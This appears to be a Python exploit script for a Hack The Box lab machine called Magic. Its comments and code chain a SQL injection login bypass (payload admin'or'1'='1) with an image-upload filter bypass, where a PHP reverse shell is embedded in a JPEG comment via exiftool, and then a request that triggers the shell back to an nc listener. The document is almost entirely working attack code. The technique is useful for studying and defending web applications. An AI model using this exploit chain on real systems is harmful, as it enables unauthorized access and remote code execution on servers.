#!/bin/bash python

#HTB magic
#Auth bypass login to "upload image" which is probably the RCE
#Must be some sort of sqli since there is only one attack surface which is login
#Submitting a single quote in one of the parameters (username or password) returns a different response length than a normal OR submitting with two single quotes
#Thus we are looking at SQL injection in the login
#So assuming the SQL query is something like "SELECT * FROM users WHERE user_id = 'admin' AND password = 'password';"
#thus closing out the parameter in the statement should allow to add additional information to the query
#---------------------------------------------------------------------------------------------------------------------
#RCE
#page has .php page extension
#Image upload
#Magic numbers at start of file passes file type check
#Use a real image file and use exiftool to add in a php reverse shell as a "Comment"
#exiftool -Comment="$(< shell.php)" Patern_test.jpg && mv Patern_test.jpg rev.php.jpg
#Set nc listener to your HTB ip address and port of your choosing (same as provided in php rev shell)

import requests
from urllib3 import encode_multipart_formdata

target = "10.10.10.185"
malicious_file = "rev.php.jpg"


s = requests.Session()

def sqli_login(target, s):
	payload = "admin'or'1'='1"
	url = "http://"+target+"/login.php"
	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	data = {"username": "admin", "password": payload}
	r = s.post(url, headers=headers, data=data, allow_redirects=True)
	if "Select Image to Upload" in r.text:
		print "(+)Successfully logged in"
		return s
	else:
		print "(+)Something went wrong"


def file_upload(target, malicious_file, s):
	url = "http://"+target+"/upload.php"
	files = {'image':(malicious_file,open(malicious_file, 'rb'), 'image/jpeg'),'submit':(None,'Upload Image')}
	r = s.post(url, cookies=s.cookies, files=files)
	if "has been uploaded" in r.text:
		print "(+)File Successfully Uploaded"

def request_shell(target):
	print "(+)Enjoy your shell"
	proxies = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
	url = "http://"+target+"/images/uploads/"+malicious_file
	r = requests.get(url)


s = sqli_login(target, s)
file_upload(target, malicious_file, s)
request_shell(target)

